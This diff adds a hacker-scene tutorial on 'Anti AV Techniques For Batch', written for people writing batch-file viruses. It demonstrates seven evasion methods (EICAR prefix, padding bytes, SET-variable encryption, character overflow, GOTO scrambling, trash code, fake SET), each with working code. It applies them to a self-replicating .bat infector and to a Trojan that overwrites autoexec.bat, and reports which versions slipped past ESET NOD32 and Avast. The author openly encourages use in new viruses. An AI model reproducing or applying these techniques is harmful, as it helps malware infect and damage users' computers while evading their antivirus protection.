@@ -1,0 +1,246 @@
+                             
+                                  @*$%$#X5O!P%@AP[4\PZX54(P^)7CC)7}$
+                                  $                                0
+                                  @           TUTORIAL:            #
+                                  U                                ^
+                                  )  Anti AV Techniques For Batch  $
+                                  *                                f
+                                  R              by                *
+                                  !                                0
+                                  2        cOrRuPt G3n3t!x         #
+                                  &                                %
+                                  *$%$#X5O!P%@AP[4\PZX54(P^)7CC)7}$%
+
+
+
+   In order to make our batch file virus a little more inconspicuos, unreadable or undetectable
+   we use batch encryption techniques to fool AV's and people trying read or decypher our code.
+   There are many different ways and today i'll explain all the possible ways i know for batch
+   encryption and AV & AV heuristics fooling. I used ESET NOD32 Anti-Virus for its great herustics
+   capabilities and Avast4 Professional Edition for normal detection. Please remember all techniques
+   have been tested on Windows Vista and work!
+ 
+
+  1)EICAR Test File:
+   ----------------
+
+   AV companies needed a way to test whether their product works on the users computer but
+   without bringing harm to it, so EICAR was born, a universal string of code that will set off
+   all AV's but will display 'EICAR TEST FILE NOT A VIRUS' or something similar, so we therefore,
+   add this string to the begining of our code in hopes that the user will let it run after seeing that
+   its a test file and not a virus. This will help when infecting people with limited knowlegde on viruses
+   so definitely not a great technique when compared to others but non the less, here's the string for the
+   EICAR 'Virus' which should be added to the beginning of your code:
+
+  -------------------------------[Cut Here]--------------------------------------
+  X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H* 
+  -------------------------------[Cut Here]--------------------------------------
+
+
+  2)Fake Bytes:
+   -----------
+
+   All AV's will only scan the first 1000 bytes of a batch file for any malicious code, so what do we do?
+   We add a whole bunch of letters in the first 1000 bytes of our code, pretty easy and an excellent
+   way to bypass scanners and in some cases AV heurstics. So here is exactly a 1000 bytes of useless code
+   which should be pasted at the beginning of your code:
+
+  -------------------------------[Cut Here]--------------------------------------
+  jfnvjdfvbdfrjcedjcndskcjlewkjdelkasusywkiqwndsjhcgbdkisknckichcdsjyefgwiednnauxxbjnkaskjgbuhyhdgddr
+  djdchcvnfdhvjknvjknvfbdfhvbdfjncfdnfhvjrhskjfnmaskldnchfvbgfvffscdjfbnjehcfnjhcbjhnvdjuknvchdhbhvhf
+  fdgvcdfgcvjhvbnfvfdhbfvdjnfvdnbjfvnjgbnjkfvsjlsfdjhfsndsajkfdsvefeyufguyshduygfbdbcyufreubfuyhfdbk
+  fndsfungcuhfjhcvnhsfdncjsjzlixldjfouyfhfrufmrnjhggvcnnfvdeyhfyfghnfguhfuyndfhfdrsognfdhjfdyfdhfdhg
+  fhvbdh7rhuigfuhgudjfdujguighsudgduhgjugsifdkgiojfdhiudfgmnjhdgufhuigfjguijgukhgkjgufdhgjfugfchghjh
+  hsbdfjdrbfjdbgvfovngkllksfjbnmgkjvnvjkgfnkbfgvhnfgijgfjknfghjgffghdunvuhnuihgfgjifugjiuhdruiryhgui
+  dsbdyhceyifgbycgnjhfhjhvfbdgjhnhjhsdhbgsftrhgbvsrulsfkewajfreihnrnusrnvcuhiurgfeuygfruyfgybfdbkjkd
+  dscgfbdofnjkfhnkjfnkovmhuihgudljcugrhnuhvgvnuivgfhgdfigjngnklvtghnmgiojgfnkjgfhnfhngfvjnkfgvlkgfng
+  fdkbsdcfhnmvghnfvkjfjkgfpkogjroisjoersmcetkuntbggkhgjhdlewrlkjrhjiurnvuinvynbtrhurenyviuntruirtunv
+  dsuifhuyafgbycfgruyfgnucafipjnfnjkhnfidhfvmdkhzkdlhfnuygjkdngtfrjhnguhyghsduvbgrjkhvsriulkghnkjhgu
+  -------------------------------[Cut Here]--------------------------------------
+
+
+  3)Standard Encryption Technique (SET):
+    -----------------------------------
+
+   As the acronym would suggest this is a technique whereby the 'set' command in MS-DOS is used
+   to encrypt the batch file and make it hard for the AV to analyze and for the user to interpret.
+   we do this by assigning a variable to a set command, this might not make sense but see below:
+
+   This was detected as 'BAT/Silly.D Virus' by ESET NOD32:
+  -------------------------------[Cut Here]--------------------------------------
+  for %%a in (*.bat) do copy %0 %%a
+  -------------------------------[Cut Here]--------------------------------------
+
+   Now by encrypting vairbles: for, in, do and copy it will become undetected. Although it was not
+   detected by encrypting only one of the variables this will not always be the case.
+   This was not detected by ESET NOD32 or Avast4:
+  -------------------------------[Cut Here]--------------------------------------
+  set a=for
+  set b=in
+  set c=do
+  set d=copy
+  %a% %%a %b% (*.bat) %c% %d% %0 %%a
+  -------------------------------[Cut Here]--------------------------------------
+ 
+   This will be compilcated for others to read but not for people with a knowledge of batch so what
+   you could do is make the set encryption appear at the bottom of your code and then begin to read the top,
+   this will work well with large code as the user will have to scroll down to see the set encryption. You
+   can do this simply by having a 'GOTO' command that will goto the decryption parameter before returning
+   to the encrypted code, using more then one variable will make it much harder to read! See below:
+  -------------------------------[Cut Here]--------------------------------------
+  @echo off
+  GOTO decrypt
+  :infect
+  %a% %%a %b% (*.bat) %c% %d% %0 %%a
+  %a% %%a %b% (C:\*.bat) %c% %d% %0 %%a
+  %a% %%a %b% (C:\Windows*.bat) %c% %d% %0 %%a
+  exit
+  :decrypt
+  set a=for
+  set b=in
+  set c=do
+  set d=copy
+  goto infect
+  -------------------------------[Cut Here]--------------------------------------
+
+
+  4)Character Overflow:
+    -------------------
+
+   Fisrt off thanks to DvL for this idea and now lets begin. This is just an awesome name i gave to
+   a Anti AV technique that will help by hiding your lines and fool the AV from detecting the right tokens
+   in your batch. All you need to do is add characters betwee each line of your code, it can also be numbers
+   I used the character 'n' as it was used in the legendary SASSER worm to cause a buffer overrun.
+   The only snag is the virus has to have more then 3 or 4 lines to work effectively.
+
+   This is a virus by Ratty which was detected as 'BAT/Ratty.Substcde.A Trojan' by ESET NOD32
+  -------------------------------[Cut Here]--------------------------------------
+  @echo off
+  ctty nul
+  @echo subst e: a:\ > c:\autoexec.bat
+  @echo subst d: a:\ >> c:\autoexec.bat
+  @echo subst c: a:\ >> c:\autoexec.bat
+  ctty con
+  cls
+  -------------------------------[Cut Here]--------------------------------------
+
+   When using the Character Overflow technique it was not detected by ESET NOD32:
+  -------------------------------[Cut Here]--------------------------------------
+  nnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnn
+  @echo off
+  nnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnn
+  ctty nul
+  nnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnn
+  @echo subst e: a:\ > c:\autoexec.bat
+  nnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnn
+  @echo subst d: a:\ >> c:\autoexec.bat
+  nnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnn
+  @echo subst c: a:\ >> c:\autoexec.bat
+  nnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnn
+  ctty con
+  nnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnn
+  cls
+  nnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnn
+  -------------------------------[Cut Here]--------------------------------------
+
+
+  5)GOTO Confuser:
+    --------------
+
+   This is a bit impractical as it takes extremely long and is pretty confusing depending on the size of your code.
+   It only works with code that is longer then 5 lines. What it does is confuse the AV by giving
+   multiple goto commands so the strings of the virus is seperate and not read as a single token so it wont be detected.
+
+   This is a virus by Ratty which was detected as 'BAT/Ratty.Substcde.A Trojan' by ESET NOD32:
+  -------------------------------[Cut Here]--------------------------------------
+  @echo off
+  ctty nul
+  @echo subst e: a:\ > c:\autoexec.bat
+  @echo subst d: a:\ >> c:\autoexec.bat
+  @echo subst c: a:\ >> c:\autoexec.bat
+  ctty con
+  cls
+  -------------------------------[Cut Here]--------------------------------------
+
+   Using the GOTO confuser it was not detected by ESET NOD32:
+  -------------------------------[Cut Here]--------------------------------------
+  @echo off
+  goto a
+  :f
+  ctty nul
+  goto b
+  :l
+  @echo subst e: a:\ > c:\autoexec.bat
+  goto c
+  :m
+  @echo subst d: a:\ >> c:\autoexec.bat
+  goto d
+  :r
+  @echo subst c: a:\ >> c:\autoexec.bat
+  ctty con
+  cls
+  :a
+  goto f
+  :b
+  goto l
+  :c
+  goto m
+  :d
+  goto r
+  -------------------------------[Cut Here]--------------------------------------
+
+
+  6)Trash Code:
+    -----------
+
+   This refers to lines of code that simply do nothing, but as far as the AV is concerned its working code
+   so wat do we do with this in mind? We put meaningless garbage between our actual code, it is however
+   important to note that the lines you are using for trash code is not used for anything:
+
+  This was detected as 'BAT/Silly.D Virus' by ESET NOD32:
+  -------------------------------[Cut Here]--------------------------------------
+  for %%a in (*.bat) do copy %0 %%a
+  -------------------------------[Cut Here]--------------------------------------
+
+   When using garbage or trash code it was not detected:
+  -------------------------------[Cut Here]--------------------------------------
+  set trash=
+  %trash% for %trash% %%a %trash% in %trash% (*.bat) %trash% do %trash% copy %trash% %0 %trash% %%a
+  -------------------------------[Cut Here]--------------------------------------
+   In the first line we made sure trash was set to nothing then added the code to the virus it worked
+   perfectly without being detected!
+
+
+
+  7)Fake SET technique:
+    ------------------
+
+   Although our Standard Encryption technique is strong enough for heuristics and AV's this technique will make it
+   much harder to be found and also to be debugged. This technique involves the "set %variable%=%command" except
+   we shall give the variables fake commands and then set the real commands see below for more clarity:
+   -------------------------------[Cut Here]--------------------------------------
+   set acv=ren
+   set acv=for
+   set acv=copy
+   set axv=yes
+   set axv=for
+   set lmno=ggg
+   set lmno=in 
+   %axv% %%a %lmno% (*.bat) do %acv% %0 %%a
+   -------------------------------[Cut Here]--------------------------------------
+   as you can see we renamed the vairble a few times which begins to get tricky especially when 
+   the code is long! No AV will detect this as it has no set string, and it will give heuristics
+   a hard time to emulate the code!
+
+
+
+   I Hope to see you using some of these techniques in up and coming batch file virii! If there is any problems with my code
+   or you have a question just e-mail me and i'll gladly help. Remember this is for educational purposes only do not use
+   maliciously! KEEP On Batching... :)
+
+
+
+  [?]Contact Me:
+     -----------
+
+  [@]immortalassassin@rocketmail.com
